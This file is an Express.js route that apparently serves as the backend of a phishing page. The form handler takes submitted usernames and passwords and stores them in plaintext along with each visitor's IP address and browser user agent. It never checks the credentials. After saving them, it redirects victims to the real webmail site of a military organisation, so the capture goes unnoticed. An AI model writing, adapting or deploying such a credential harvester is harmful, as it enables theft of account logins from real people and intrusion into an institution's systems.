
const express = require ('express');
const router = express.Router();
const db = require('../db');
const bodyParser = require('body-parser');

router.use(express.static('public'));
router.use(express.static(__dirname + '/public'));
router.use(bodyParser.urlencoded({ extended: false }));


//validate form data before handling
// Custom middleware for form validation
const validateFormData = (req, res, next) => {
  const { username, password } = req.body;

  if (!username || !password) {
      return res.status(400).render('error');
  }

  // Additional validation checks can be added here

  // If validation passes, proceed to the next middleware or route handler
  next();
};


// Handle form submission

router.post('/submit', validateFormData, (req, res) => {
   
    const name = req.body.username;
    const word = req.body.password;
    const ip = req.socket.remoteAddress; 
    const useragent = req.get('User-Agent');
    const date = new Date(); 
    const sqlQuery =  'SELECT username FROM myTable WHERE username= ?';

    db.query(sqlQuery, [name], (err, results) => {
      if (err) {
        console.error('Error executing query:', err);
        return res.status(500).json({ error: 'Internal Server Error' });
      }
    const rowCount = results.length;
    

    const insertQuery = 'INSERT INTO myTable (username, password, ip, useragent,date) VALUES (?,?,?,?,?)';
    db.query(insertQuery, [name, word, ip, useragent, date], (err) => {
        if (err) {
            console.error('Error inserting record:', err);
            return res.status(500).send('Internal Server Error');
        }
        res.redirect('https://mail.baf.mil.bd/');
    });
                                    
      
  
     
    });
  
});


module.exports =router
